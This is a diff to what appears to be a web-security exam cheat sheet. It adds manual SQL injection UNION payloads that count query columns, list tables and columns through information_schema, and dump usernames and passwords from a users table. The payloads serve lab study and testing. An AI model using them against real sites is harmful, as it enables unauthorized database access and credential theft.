@@ -1284,21 +1284,45 @@ sqlmap -v -u 'https://TARGET.net/filter?category=*' -p 'category' --batch --flus
 
 ### Manual SQLi  
 
->SQL injection vulnerability exploited manually by first finding list of **tables** in the database.  
+>SQL injection UNION attack, determining the **number of columns** returned by the query.  
 
-```sql
+```
+'+UNION+SELECT+NULL,NULL--
+```  
+
+>Finding a column containing text, to be used for reflecting information extracted.  
+
+```
+'+UNION+SELECT+'abcdef',NULL,NULL--
+```  
+
+>SQL injection vulnerability exploited manually by identifying a list of **tables** in the database.  
+
+```SQL
 '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
 ```  
 
->Second retrieve the names of the **columns** in the users table.  
+>Retrieving data from other tables, sample is below payload to retrieve the contents of the users table.  
 
-```sql
+```
+'+UNION+SELECT+username,+password+FROM+users--
+```  
+
+>Retrieving multiple values in a single column able to reflect text.  
+
+```
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+```  
+
+>Retrieve the names of the **columns** in the ***users*** table.  
+
+```SQL
 '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_XXXX'--
 ```  
 
 >Final step **dump data** from the username and passwords columns.  
 
-```sql
+```SQL
 '+UNION+SELECT+username_XXX,+password_XXX+FROM+users_XXXX--
 ```  
 
